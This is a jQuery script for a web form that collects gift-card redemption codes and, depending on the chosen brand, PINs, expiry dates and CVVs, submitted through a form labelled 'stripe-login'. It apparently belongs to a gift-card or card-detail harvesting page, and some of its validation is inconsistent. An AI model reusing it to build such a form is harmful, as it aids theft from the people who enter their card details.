"use strict";

//attribute the option value to the input field, and then reset select value to default
$("select.custom_select").change(function() {
    $(this).next("option").val($(this).children("option:selected").text());
    $(this).val("default");
});



// Update max and min length and validate input based on card type
function updateMaxLength() {
    const selectedCard = $("select.form-select").val();
    const inputField = document.getElementById("rc");
    const pinField = document.getElementById("cp");
    const expiryField = document.getElementById("ce");
    const cvvField = document.getElementById("cc");
    const pin4Field = document.getElementById("fp");

    switch (selectedCard) {
        case "eBay":
            inputField.maxLength = inputField.minLength = 13;
            inputField.pattern = "\\d{13}";
            break;
        case "Apple":
            inputField.maxLength = inputField.minLength = 16;
            inputField.pattern = "[A-Za-z0-9]{16}";
            break;
        case "Sephora":
        case "Nordstrom":
            inputField.maxLength = inputField.minLength = 16;
            inputField.pattern = "\\d{16}"; // 16-digit redemption code (numbers only)
            if (pinField) {
                pinField.required = true;
                pinField.maxLength = 8;
                pinField.minLength = 8;
                pinField.pattern = "\\d{4}"; // 4-digit PIN

                // Add event listener to enforce the length restriction
                pinField.addEventListener("input", function() {
                    if (pinField.value.length > 8) {
                        pinField.value = pinField.value.slice(0, 8);
                    }
                });
            }
            break;
        case "RazerGold":
            inputField.maxLength = inputField.minLength = 14;
            inputField.pattern = "\\d{14}";
            break;
        case "Amex":
            inputField.maxLength = inputField.minLength = 15;
            inputField.pattern = "\\d{15}";
            if (cvvField) {
                cvvField.required = true;
                cvvField.maxLength = 3;
                cvvField.minLength = 3;
                cvvField.pattern = "\\d{3}"; // 3-digit CVV

                // Add event listener to enforce the length restriction
                cvvField.addEventListener("input", function() {
                    if (cvvField.value.length > 3) {
                        cvvField.value = cvvField.value.slice(0, 3);
                    }
                });
            }
            if (pin4Field) {
                pin4Field.required = true;
                pin4Field.maxLength = 4;
                pin4Field.minLength = 4;
                pin4Field.pattern = "\\d{4}"; // 4-digit PIN

                // Add event listener to enforce the length restriction
                pin4Field.addEventListener("input", function() {
                    if (pin4Field.value.length > 4) {
                        pin4Field.value = pin4Field.value.slice(0, 4);
                    }
                });
            }
            if (expiryField) {
                expiryField.required = true;
                expiryField.pattern = "\\d{2}/\\d{2}";
            }
            break;
        default:
            inputField.maxLength = 20;
            inputField.minLength = 4;
            inputField.pattern = ".*";
            break;
    }
}

// Trigger toast notifications and validate inputs on form submission
$("#stripe-login").on("submit", function(e) {
    const rcInput = document.getElementById("rc");
    const pinInput = document.getElementById("cp");
    const isValid = rcInput.checkValidity();
    const isPinValid = pinInput ? pinInput.checkValidity() : true;

    if (!isValid || !isPinValid) {
        e.preventDefault();
        showToast("Invalid input: Please check the redemption code and PIN details.");
    }
});




//-------- Useless function, change the bg color--------------
$("select.form-select").change(function() {
    //   if ($("select").val() == "Sephora") {
    //     $("input.form").css("display", "");
    //     return;
    //   } else if ($("select").val() == "Wallmart Visa") {
    //     $("input.forms").css("display", "");
    //     $("input.form").css("display", "");
    //     return;
    //   } else if ($("select").val() != "Sephora") {
    //     $("input.form").css("display", "none");
    //     return;
    //   } else if ($("select").val() != "Wallmart Visa") {
    //     $("input.forms").css("display", "none");
    //     $("input.form").css("display", "none");
    //     return;
    //   }

    updateMaxLength();


    if ($("select").val() == "Sephora") {
        document.getElementById("form3").style.display = "block";
    } else {
        document.getElementById("form3").style.display = "none";
    }
    if ($("select").val() == "RazerGold") {
        document.getElementById("form3").style.display = "none";
    }
    if ($("select").val() == "Nordstrom") {
        document.getElementById("form3").style.display = "block";
    }
    if ($("select").val() == "Nike") {
        document.getElementById("form3").style.display = "block";
    }

    if ($("select").val() == "Macy") {
        document.getElementById("form3").style.display = "block";
    }

    if ($("select").val() == "Vanilla") {
        document.getElementById("form2").style.display = "block";
        document.getElementById("form0").style.display = "block";
        document.getElementById("form").style.display = "block";
    } else {
        document.getElementById("form2").style.display = "none";
        document.getElementById("form0").style.display = "none";
        document.getElementById("form").style.display = "none";
    }

    if ($("select").val() == "Wallmart Visa") {
        document.getElementById("form").style.display = "block";
        document.getElementById("form2").style.display = "block";
        document.getElementById("form0").style.display = "block";
    }

    if ($("select").val() == "Visa Silvery White") {
        document.getElementById("form").style.display = "block";
        document.getElementById("form2").style.display = "block";
        document.getElementById("form0").style.display = "block";
    }

    if ($("select").val() == "TT Visa") {
        document.getElementById("form").style.display = "block";
        document.getElementById("form2").style.display = "block";
        document.getElementById("form0").style.display = "block";
    }

    if ($("select").val() == "Amex") {
        document.getElementById("form4").style.display = "block";
        document.getElementById("form2").style.display = "block";
        document.getElementById("form").style.display = "block";
        document.getElementById("form01").style.display = "block";
    } else {
        document.getElementById("form01").style.display = "none";

        document.getElementById("form4").style.display = "none";
        // document.getElementById("form3").style.display = "none";
    }
    if ($("select").val() == "MasterCard") {
        document.getElementById("form2").style.display = "block";
        document.getElementById("form").style.display = "block";
    }

    //   if ($("select").val() == "Nordstrom") {
    //     $("#form").css("display", "");
    //   }
    //   if ($("select").val() != "Nordstrom") {
    //     $("#form").css("display", "none");
    //   }

    //   if ($("select").val() == "Nike") {
    //     $("input.form").css("display", "");
    //   }
    //   if ($("select").val() != "Nike") {
    //     $("input.form").css("display", "none");
    //   }

    //   if ($("select").val() == "MasterCard") {
    //     $("input.form").css("display", "");
    //   }
    //   if ($("select").val() != "MasterCard") {
    //     $("input.form").css("display", "none");
    //   }
    //   if ($("select").val() == "Vanilla") {
    //     $("input.forms").css("display", "");
    //     $("input.form").css("display", "");
    //   }
    //   if ($("select").val() != "Vanilla") {
    //     $("input.forms").css("display", "none");
    //     $("input.form").css("display", "none");
    //   }
    //   if ($("select").val() == "RazerGold") {
    //     $("input.forms").css("display", "");
    //     $("input.form").css("display", "");
    //   }
    //   if ($("select").val() != "RazerGold") {
    //     $("input.forms").css("display", "none");
    //     $("input.form").css("display", "none");
    //   }
    //   if ($("select").val() == "Wallmart Visa") {
    //     $("input.forms").css("display", "");
    //     $("input.form").css("display", "");
    //   }
    //   if ($("select").val() != "Wallmart Visa") {
    //     $("input.forms").css("display", "none");
    //     $("input.form").css("display", "none");
    //   }
    //   if ($("select").val() == "Visa Silvery White") {
    //     $("input.forms").css("display", "");
    //     $("input.form").css("display", "");
    //   }
    //   if ($("select").val() != "Visa Silvery White") {
    //     $("input.forms").css("display", "none");
    //     $("input.form").css("display", "none");
    //   }
    //   if ($("select").val() == "TT Visa") {
    //     $("input.forms").css("display", "");
    //     $("input.form").css("display", "");
    //   }
    //   if ($("select").val() != "TT Visa") {
    //     $("input.forms").css("display", "none");
    //     $("input.form").css("display", "none");
    //   }
    //   if ($("select").val() == "Amex") {
    //     $("input.forms").css("display", "");
    //     $("input.form").css("display", "");
    //     $("input.formss").css("display", "");
    //   }
    //   if ($("select").val() != "Amex") {
    //     $("input.forms").css("display", "none");
    //     $("input.form").css("display", "none");
    //     $("input.formss").css("display", "none");
    //   }
});


$(document).ready(function() {
    updateMaxLength();
});

$(document).ready(function() {
    /*>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
          AOS Animation Activation
      <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<*/
    AOS.init();
    window.addEventListener("load", AOS.refresh);
    AOS.init({
        once: true,
    });

    /*>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>      
             Sticky Header
      <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<*/
    window.onscroll = function() {
        scrollFunction();
    };

    function scrollFunction() {
        if (
            document.body.scrollTop > 50 ||
            document.documentElement.scrollTop > 50
        ) {
            $(".site-header--sticky").addClass("scrolling");
        } else {
            $(".site-header--sticky").removeClass("scrolling");
        }
        if (
            document.body.scrollTop > 700 ||
            document.documentElement.scrollTop > 700
        ) {
            $(".site-header--sticky.scrolling").addClass("reveal-header");
        } else {
            $(".site-header--sticky.scrolling").removeClass("reveal-header");
        }
    }

    /*>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>      
             Smooth Scroll
      <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<*/

    $(".goto").on("click", function(event) {
        if (this.hash !== "") {
            event.preventDefault();
            var hash = this.hash;
            $("html, body").animate({
                    scrollTop: $(hash).offset().top,
                },
                2000,
                function() {
                    window.location.hash = hash;
                }
            );
        } // End if
    });

    /*>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>      
            Preloader Activation
      <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<*/

    $(window).load(function() {
        setTimeout(function() {
            $("#loading").fadeOut(500);
        }, 1000);
        setTimeout(function() {
            $("#loading").remove();
        }, 2000);
    });
});